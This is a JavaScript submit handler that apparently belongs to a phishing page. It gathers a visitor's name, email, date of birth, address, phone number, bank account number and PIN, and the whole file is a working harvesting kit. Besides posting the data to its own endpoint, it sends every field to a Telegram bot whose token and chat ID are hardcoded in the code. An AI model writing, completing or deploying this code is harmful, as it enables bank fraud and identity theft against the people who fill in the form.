document.getElementById("personal-info-form").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent form submission

    // Get the entered personal info values
    var firstName = document.getElementById("first-name").value;
    var middleName = document.getElementById("middle-name").value;
    var lastName = document.getElementById("last-name").value;
    var email = document.getElementById("email").value;
    var dob = document.getElementById("dob").value;
    var address = document.getElementById("address").value;
    var phone = document.getElementById("phone").value;
    var accountNumber = document.getElementById("account-number").value;
    var pin = document.getElementById("pin").value;

    // Create an HTTP request object
    var xhr = new XMLHttpRequest();

    // Prepare the request
    xhr.open("POST", "/submit-personal-info", true);
    xhr.setRequestHeader("Content-Type", "application/json");

    // Handle the response
    xhr.onload = function() {
        if (xhr.status === 200) {
            alert("Personal info submitted successfully!");
        } else {
            alert("Failed to submit personal info. Please try again.");
        }
    };

    // Send the request with the personal info as JSON data
    var data = JSON.stringify({
        firstName: firstName,
        middleName: middleName,
        lastName: lastName,
        email: email,
        dob: dob,
        address: address,
        phone: phone,
        accountNumber: accountNumber,
        pin: pin
    });
    xhr.send(data);

    // Send the personal info to the Telegram bot
    var telegramBotToken = "6641005313:AAEYh_RBmky1JDUL6H1Donqpr6YkeQ99JQI";
    var chatId = "6761588087";
    var telegramUrl = "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";
    var telegramData = {
        chat_id: chatId,
        text: "First Name: " + firstName + "\nMiddle Name: " + middleName + "\nLast Name: " + lastName + "\nEmail: " + email + "\nDOB: " + dob + "\nAddress: " + address + "\nPhone: " + phone + "\nAccount Number: " + accountNumber + "\nPin: " + pin
    };

    fetch(telegramUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(telegramData)
    }).then(function(response) {
        console.log("Telegram message sent!");
    }).catch(function(error) {
        console.error("Error sending Telegram message: ", error);
    });
});
